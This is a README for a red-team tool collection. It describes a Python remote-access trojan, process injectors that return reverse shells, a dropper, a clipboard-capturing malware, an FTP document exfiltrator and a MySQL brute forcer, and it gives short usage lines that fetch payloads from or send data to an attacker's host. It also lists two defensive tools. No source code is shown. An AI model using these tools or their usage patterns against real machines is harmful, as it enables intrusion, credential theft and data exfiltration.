# RedTeamPets
A collection of handy and specific tools for the Red Teamer

PLEASE USE WISELY AND FOR RESEARCH PURPOSES ONLY. I AM NOT RESPONSIBLE FOR ANY MALICIOUS ACTIONS PERFORMED BY USING MY CODES MALICIOUSLY AS IT'S ORIGINAL FORM OR MODIFIED.

__________________________________________________________________________________________________________________________________________________________________


ConvinientRAT:

An Interactive CLI RAT made with Python, that has basic features such as:
Exfiltration,
Persistence,
Privilage Esclation,
Standard Shell,
Nishang Shell,
Credential Dumping,
Mimikatz,
Information gathering,
Downloader

Usage: Start the Server, Launch the client from victim on the same IP and PORT of the server. Rest, A help menu is available on the server itself. Feature updates may continue in the future.


R3dJ0hn:

A C program to inject Single-Stage shellcode into the memory of another running process. It first scans through all the running processes and matches a set of pre-mentioned process names. It tries to acquire an handle to each of them and stops it it gets it.
Then injects a custom shellcode into the memory, thus giving a reverse shell back to the adversary and later on adds registry startup key for persistence. Long sleep timer induced to induce confusion of the blue teamer over the other side.
The project needs to be built each time for each purpose.


Split Drop in Mem:

Another process injector but made with Python that has a dropper built within. The Host.py needs to be run with a 64 bit Single-Stage reverse shell.exe. Example: python host.py reverse_sh.exe. This exe file will be converted to shellcode via Donut and then then encrypted and hosted over HTTP.
Once, the dropper is launched from the victim PC (python drop.py IP:PORT), the encrypted file, KEY and IV will be downloaded. Then the shellcode will be decrypted and injected into python's own memory, thus giving a remote shell back to the adversary.


WinProcInjDLL:

Another process injector made with C, but this time a DLL will be injected instead of a shellcode. The DLL can be made by say MSFVenom.
The DLL has to be hosted via HTTP as payload.dll (Static Naming Convention), and then the C program to be compiled and launched in the victim PC as filename.exe http://IP:PORT/payload.dll. The DLL will be downloaded and injected into Notepad (Can be changed before compilation), Thus giving a reverse shell back to the adversary.


BruteMysql:

A simple wordlist based MySQL Bruteforce program in python. Nothing fancy.


ClipWatch:

A python malware that is programmed to launch from Admin. Creates Persistence via Registry and Scheduled tasks.
It runs periodically and watches the clipboard for data. As it captures the data, it collects it and writes to a file in the same directory. This file could be later exfiltrated. In the future, a Call back home feature could be implemented to upload the data directly onto a server.


Dump VirusShare:

(Blue Team): If one has a special access to VirusShare then this app can't help but if not, This tool will crawl the whole hash directory of VirusShare.com and write a CSV file with all the hashes possible. This will be benefical to Blue teamers often. Though the process is time consuming, but still 100 times faster than the manual approach.


Invoke-Adversary 2022:

Nothing original but Invoke-Adversary already exists in GitHub that is quite used by security companies to demonstrate red team simulation to the clients. Only problem is the original is old and runs on commands and cmdlets from old powershell versions. I have just morphed it to be used with the current powershell version of 2022.


Xfiltrator:

An exfiltration malware made with Python that connects back to an FTP server created by the adversary and it eventually downloads all document based files present within the victim PC. 
Usage: python xfiltrator.py FTP_IP FTP_Username FTP_password


bofhelper:

Another Python based tool that basically helps to find the IP offset during a Buffer Overflow simulation. I have made this for myself once when I was learning to BOF. Best thing about it is you don't have to memorize commands. The whole thing is made interactive.


Eyeris:

(Blue Team): A Python based tool that when provided a PID of an administrative CMD, acts as a task manager but only for that one process.
This is benificial for understanding process flow of malwares so that a pattern can be extracted and an EDR custom query could be built for obvious reasons. This feature is by default present in EDRs but ofcourse personally no one has red team simulation access for research purposes except people working in the EDR company. Anyways
Usage:
Provide a PID from a CMD.
Run a sample malware from the same CMD.
Quit the CMD once it's activities are over.
This program will generate a Tree-Node structure JSON, that can be analyzed and referenced for building the custom EDR queries.
